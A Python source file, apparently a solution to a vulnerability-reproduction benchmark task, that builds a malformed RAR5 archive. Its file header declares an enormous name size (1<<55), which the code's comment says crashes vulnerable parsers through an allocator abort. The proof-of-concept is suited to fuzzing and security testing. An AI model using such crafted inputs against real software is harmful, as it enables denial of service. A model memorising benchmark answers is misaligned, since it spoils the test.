import os
import tarfile
import zlib


def _vint(n: int) -> bytes:
    if n < 0:
        raise ValueError("vint expects non-negative integer")
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def _make_rar5_block(header_type: int, header_flags: int, body: bytes) -> bytes:
    header = _vint(header_type) + _vint(header_flags) + body

    # RAR5 header_size includes itself (vint(header_size)) and the rest of header (type/flags/body),
    # excluding the 4-byte CRC field.
    hs = len(header) + 1
    while True:
        hs_enc = _vint(hs)
        new_hs = len(hs_enc) + len(header)
        if new_hs == hs:
            break
        hs = new_hs

    payload = _vint(hs) + header
    crc = zlib.crc32(payload) & 0xFFFFFFFF
    return crc.to_bytes(4, "little") + payload


def _generate_poc_bytes() -> bytes:
    sig = b"Rar!\x1a\x07\x01\x00"

    main_body = _vint(0)  # main flags
    main_block = _make_rar5_block(1, 0, main_body)

    # File header fields (minimal, with file_flags=0 so optional fields are omitted):
    # file_flags, unpacked_size, attributes, compression_info, host_os, name_size
    huge_name_size = 1 << 55  # big enough to trigger sanitizer allocator abort in vulnerable versions
    file_body = _vint(0) + _vint(0) + _vint(0) + _vint(0) + _vint(0) + _vint(huge_name_size)
    file_block = _make_rar5_block(2, 0, file_body)

    return sig + main_block + file_block


class Solution:
    def solve(self, src_path: str) -> bytes:
        return _generate_poc_bytes()